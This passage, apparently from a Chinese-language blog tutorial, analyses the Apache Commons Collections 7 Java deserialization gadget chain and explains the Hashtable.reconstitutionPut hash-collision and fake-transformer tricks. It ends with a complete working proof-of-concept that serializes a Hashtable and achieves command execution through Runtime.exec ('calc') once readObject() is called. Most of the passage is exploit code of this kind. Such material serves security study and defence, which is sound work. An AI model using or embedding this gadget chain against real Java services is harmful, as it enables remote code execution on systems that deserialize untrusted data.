<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;K,V&gt;[] tab, K key, V value)</span></span><br><span class="line">    <span class="keyword">throws</span> StreamCorruptedException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Makes sure the key is not already in the hashtable.</span></span><br><span class="line">    <span class="comment">// This should not happen in deserialized version.</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line">    <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="comment">//e=传入table里的第一个key-value对</span></span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<span class="comment">//此处调用了equals()</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Creates the new entry.</span></span><br><span class="line">    Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">    tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们发现<code>HashMap</code>继承了<code>AbstractMap</code>，如果我们的变量<code>e</code>为<code>lazyMap</code>，它的key值则为<code>hashMap</code>，从而我们会call到**hashMap的equals()**，就能触发漏洞了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206200746114.png" alt="image-20211206200746114"></p>
<h4 id="Hashtable-readObject"><a href="#Hashtable-readObject" class="headerlink" title="Hashtable.readObject()"></a>Hashtable.readObject()</h4><p>跟踪发现<code>reconstitutionPut()</code>刚好会被<code>Hashtable.readObject()</code>所调用。此处的<code>newTable</code>是新的，我们无法赋值，但是在<code>reconstitutionPut()</code>方法中，我们可以看到在for循环后面，有一句<code>tab[index] = new Entry&lt;&gt;(hash, key, value, e);</code></p>
<p>这是将我们的key-value对存入这个<strong>tab</strong>中，而这个tab正好对应了<code>readObjcet()</code>里的<strong>newTable</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206201003311.png" alt="image-20211206201003311"></p>
<hr>
<p><strong>遇到的一些困惑：</strong></p>
<p>起初我很疑惑<strong>newTable</strong>和<strong>tab</strong>的关系，后来我明白了，<strong>newTable</strong>作为参数<strong>tab</strong>传入<code>reconstitutionPut()</code>后，在<code>reconstitutionPut()</code>中对<strong>tab</strong>的变化也是会影响到<strong>newTable</strong>的 - 也就是所谓的<strong>sideffect</strong>，下面我做了个实验：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Teacher</span> <span class="variable">teacher</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>(<span class="number">28</span>);<span class="comment">//创建一个28岁的老师</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>(teacher);<span class="comment">//把老师的instance传给学生</span></span><br><span class="line">        <span class="comment">//学生会把传给它的老师改成53岁</span></span><br><span class="line">        System.out.println(teacher.getAge());<span class="comment">//打印老师的年龄</span></span><br><span class="line">        <span class="comment">//输出结果为53岁</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">(Teacher teacher)</span>&#123;</span><br><span class="line">        teacher.modifyAge(<span class="number">53</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Teacher</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">modifyAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p>再看<code>Hashtable.writeObject()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Entry&lt;K, V&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="comment">// Write out the length, threshold, loadfactor</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Write out length, count of elements</span></span><br><span class="line">        s.writeInt(table.length);</span><br><span class="line">        s.writeInt(count);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Stack copies of the entries in the table</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; entry = table[index];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                entryStack =</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                entry = entry.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">    <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">        s.writeObject(entryStack.key);</span><br><span class="line">        s.writeObject(entryStack.value);</span><br><span class="line">        entryStack = entryStack.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里将Hashtable里的key-value对给序列化了。</p>
<p>因此我们只需要构造key值为<strong>lazyMap</strong>就可以了。</p>
<p>我们初步的POC如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap,<span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>但是这个POC是有问题的。</p>
<h4 id="两个LazyMap"><a href="#两个LazyMap" class="headerlink" title="两个LazyMap"></a>两个LazyMap</h4><p>在<code>Hashtable.reconstitutionPut()</code>中，<strong>for循环</strong>里触发了我们的利用链。但如果我们<strong>tab</strong>里只有一个key-value对，那么就不会再触发了，因为第一次加入key-value对时tab里面没有值，是不会进入for循环的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">    <span class="comment">//如果tab里为空，不会进入for循环</span></span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 只会直接添加key-value到这个tab里</span></span><br><span class="line">Entry&lt;K,V&gt; e = tab[index];</span><br><span class="line">tab[index] = <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(hash, key, value, e);</span><br><span class="line">count++;</span><br></pre></td></tr></table></figure>

<p>所以我们需要添加两个<strong>lazyMap</strong>,而第二个<strong>lazyMap</strong>才能让我们进入<strong>for循环</strong></p>
<p>改进后POC如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap2.put(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;4&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>可是这样的POC依然不对。</p>
<h4 id="一样的hash"><a href="#一样的hash" class="headerlink" title="一样的hash"></a>一样的hash</h4><p>依然是for循环的毛病</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> hash(key);</span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (hash &amp; <span class="number">0x7FFFFFFF</span>) % tab.length;</span><br><span class="line"><span class="keyword">for</span> (Entry&lt;K,V&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">    <span class="comment">//如果tab里为空，不会进入for循环</span></span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设我们现在已经put了第一个key-value对，现在tab的内容如下</p>
<ul>
<li><code>&lt;lazyMap,1&gt;</code></li>
</ul>
<p>当我们用第二个<code>&lt;lazyMap2,2&gt;</code>开始执行<strong>for loop</strong>的时候，会判断<strong>tab[index]<strong>是否为空，如果tab里面不存在，那么就不能进入</strong>for循环</strong>（太坑了）- 意味着我们第一次的**hash(key)<strong>和第二次的</strong>hash(key)**必须一样</p>
<p>经测试当lazyMap的key值为xx和zZ时，得到的hashCode是一样的，所以我们能够进入for循环</p>
<p>现在的POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2,<span class="number">2</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Fake-Transformer"><a href="#Fake-Transformer" class="headerlink" title="Fake Transformer"></a>Fake Transformer</h4><p>和cc6差不多，我们在执行**hashtable.put()**时，同样会触发利用链</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206205356150.png" alt="image-20211206205356150"></p>
<p>那么我们只需要先传入一个<strong>fakeTransformer</strong>，最后再改回来就好了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">        <span class="comment">//获取getRuntime方法</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);<span class="comment">//这里我们传入假的transformer，实际为空</span></span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap.put(<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">innerMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap,<span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化</span></span><br><span class="line"><span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">objectOutputStream.writeObject(hashtable);<span class="comment">//序列化</span></span><br><span class="line">objectOutputStream.flush();</span><br><span class="line">objectOutputStream.close();</span><br><span class="line">fileOutputStream.close();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="comment">//反序列化</span></span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>原本以为这样就结束了，结果计算器又不跳出来了。还记得<strong>cc6</strong>吗，我们出现的问题和这个一模一样</p>
<h4 id="FakeTransformer引发的LazyMap问题"><a href="#FakeTransformer引发的LazyMap问题" class="headerlink" title="FakeTransformer引发的LazyMap问题"></a>FakeTransformer引发的LazyMap问题</h4><p>在<code>LazyMap.get()</code>中，<code>factory</code>为我们传入的空的<code>Transformer</code>，key值为<code>yy</code>，同时key值被放入<code>hashtable</code>.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">super</span>.map.containsKey(key)) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);<span class="comment">//这里key值为yy</span></span><br><span class="line">        <span class="built_in">super</span>.map.put(key, value);<span class="comment">//yy被放进hashtable</span></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如下图：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206210624980.png" alt="image-20211206210624980"></p>
<p>我们在<code>AbstractMap.equals()</code>方法中有一个if判断，此处的**size()**为1，<code>m.size()</code>为2 -》 因为<code>yy</code>被加进了<code>hashtable</code>，所以会直接返回false，从而不会触发利用链。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206210904041.png" alt="image-20211206210904041"></p>
<p>因此我们需要把<code>yy</code>从<code>lazyMap</code>中移除。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br></pre></td></tr></table></figure>



<h3 id="POC构造-2"><a href="#POC构造-2" class="headerlink" title="POC构造"></a>POC构造</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, IOException &#123;</span><br><span class="line">        <span class="comment">//lazymap.get()-&gt;factory[constructor].transform()</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);<span class="comment">//这里我们传入假的transformer，实际为空</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap.put(<span class="string">&quot;yy&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        innerMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2,chainedTransformer);<span class="comment">//return a new lazyMap</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2,<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> chainedTransformer.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chainedTransformer,transformers);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashtable);<span class="comment">//序列化</span></span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">         * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;lz.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//只需要readObject()就会触发漏洞</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Reference-5"><a href="#Reference-5" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/ac9529#Poc-4">Commons-Collections 1-7 分析</a></p>
<h2 id="Commons-Collections-11"><a href="#Commons-Collections-11" class="headerlink" title="Commons Collections 11"></a>Commons Collections 11</h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><p>学完cc1-7好久，研究shiro550的时候发现要用到cc11，因为一些原因cc6不能用。</p>
<p>因此在这里会对cc11进行详细讲解，同时也是对之前的cc链的复习。</p>
<p>cc11是cc1、cc2、cc5、cc6的结合，用到了InvokerTransformer、javassist字节码编写、TemplateImpl字节码执行、TiedMapEntry、HashMap等</p>
<h3 id="环境搭建-7"><a href="#环境搭建-7" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这次我是直接使用maven创建的项目，就不用自己来导包了</p>
